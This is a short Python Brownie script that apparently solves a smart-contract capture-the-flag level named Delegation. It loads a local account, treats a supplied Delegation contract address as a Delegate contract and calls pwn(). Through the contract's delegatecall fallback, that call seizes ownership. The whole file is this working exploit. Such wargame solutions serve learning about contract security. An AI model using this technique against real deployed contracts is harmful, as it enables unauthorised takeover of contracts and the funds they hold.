from brownie import Delegation, Delegate, accounts

def main(delegation_addr):
  me = accounts.load("default")
  delegation = Delegate.at(delegation_addr)
  delegation.pwn({'from': me})